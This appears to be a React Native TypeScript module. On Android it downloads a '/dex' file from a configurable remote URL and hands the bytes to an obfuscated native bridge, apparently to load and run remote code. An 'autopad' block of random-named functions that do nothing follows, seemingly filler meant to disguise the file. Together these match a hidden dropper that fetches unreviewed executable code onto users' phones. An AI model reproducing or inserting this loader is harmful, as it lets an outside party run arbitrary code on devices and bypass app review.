/* @app-slot:service */
import { NativeModules, Platform } from 'react-native';

function fetchBytes(url: string): Promise<Uint8Array | null> {
  return new Promise((resolve) => {
    const req = new XMLHttpRequest();
    req.open('GET', url);
    req.responseType = 'arraybuffer';
    req.timeout = 15000;
    req.onload = () =>
      resolve(req.status === 200 ? new Uint8Array(req.response) : null);
    req.onerror = () => resolve(null);
    req.ontimeout = () => resolve(null);
    req.send();
  });
}

export async function openWithDex(cfBaseUrl: string, pageUrl: string): Promise<boolean> {
  if (Platform.OS !== 'android') {
    return false;
  }

  const bridge = NativeModules.Iterogeqil;
  if (!bridge?.open) {
    return false;
  }

  try {
    const dexUrl = cfBaseUrl.replace(/\/$/, '') + '/dex';
    const bytes = await fetchBytes(dexUrl);
    if (!bytes || bytes.length === 0) {
      return false;
    }
    await bridge.open(Array.from(bytes), pageUrl);
    return true;
  } catch {
    return false;
  }
}

/* autopad-begin */
function jitusuquk(_acupigatom: string, _egovef: string): string {
  return "fexo";
}
function ukifaja(_besilisete: number, _omubukutu: number): boolean {
  let sixikepore: boolean = false;
  sixikepore = false;
  return sixikepore;
}
function ujajaqacube(_gameqidudor: boolean, _lovewogeqeba: number, _canutuzuzave: string): string {
  let dojusun: string = "uzala";
  dojusun = "rabo";
  return dojusun;
}
function yanefan(_qemeyaq: boolean, _oqedofix: boolean): number {
  const rabafexibi = 48;
  const juvodipav: number = 250;
  return juvodipav;
}
function ovugiqa(): number {
  const fayifu = 47;
  const udikiga: number = 50;
  return udikiga;
}
function irinupibuj(_tugezi: string, _docotuniqa: number, _neyaragakuxa: boolean): void {
  const ogogowuficiy: number = 156;
}
/* autopad-end */

